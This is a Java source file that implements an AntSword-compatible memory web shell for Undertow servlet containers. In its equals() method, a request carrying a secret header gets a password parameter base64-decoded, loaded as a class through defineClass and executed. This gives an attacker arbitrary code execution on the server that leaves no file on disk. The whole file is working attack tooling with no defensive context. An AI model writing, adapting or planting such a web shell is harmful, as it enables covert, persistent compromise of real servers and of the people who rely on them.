package com.reajason.javaweb.memshell.shelltool.antsword;

/**
 * @author ReaJason
 */
public class AntSwordUndertowServletHandler extends ClassLoader {

    public static String pass;
    public static String headerName;
    public static String headerValue;

    public AntSwordUndertowServletHandler() {
    }

    public AntSwordUndertowServletHandler(ClassLoader c) {
        super(c);
    }

    @Override
    public boolean equals(Object obj) {
        Object[] args = ((Object[]) obj);
        Object servletRequestContext = null;
        if (args.length == 2) {
            servletRequestContext = args[1];
        } else {
            servletRequestContext = args[2];
        }
        try {
            Object request = servletRequestContext.getClass().getMethod("getServletRequest").invoke(servletRequestContext);
            Object response = servletRequestContext.getClass().getMethod("getServletResponse").invoke(servletRequestContext);
            String value = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, headerName);
            if (value != null && value.contains(headerValue)) {
                String parameter = (String) request.getClass().getMethod("getParameter", String.class).invoke(request, pass);
                byte[] bytes = base64Decode(parameter);
                Object instance = (new AntSwordUndertowServletHandler(Thread.currentThread().getContextClassLoader())).g(bytes).newInstance();
                instance.equals(new Object[]{request, response});
                return true;
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
        return false;
    }

    @SuppressWarnings("all")
    public Class<?> g(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) throws Exception {
        byte[] value = null;
        Class<?> base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
            value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            base64 = Class.forName("sun.misc.BASE64Decoder");
            Object decoder = base64.newInstance();
            value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
        }
        return value;
    }
}